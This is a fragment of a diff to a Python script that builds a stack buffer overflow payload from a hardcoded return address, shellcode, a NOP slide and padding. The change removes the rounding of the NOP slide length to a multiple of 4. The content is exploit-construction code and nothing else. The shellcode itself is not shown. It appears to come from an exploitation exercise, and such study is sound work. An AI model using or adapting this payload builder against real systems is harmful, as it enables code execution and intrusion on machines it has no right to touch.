@@ -27,9 +27,7 @@ def get_payload():
     addr = chr(0x78) + chr(0xde) + chr(0xff) + chr(0xbf)
     shellcode = get_shellcode()
     nop = assemble.assemble_data("nop")
-    # make a nop slide with a length that is a multiple of 4
-    # so the shell will start at the start of a register
-    nopLen = 4 * ((totalMsgLen - len(shellcode)) // 4)
+    nopLen = totalMsgLen - len(shellcode)
     nopSlide = nop * nopLen
     # suffix padding, between the end of the shell code and
     # our return address
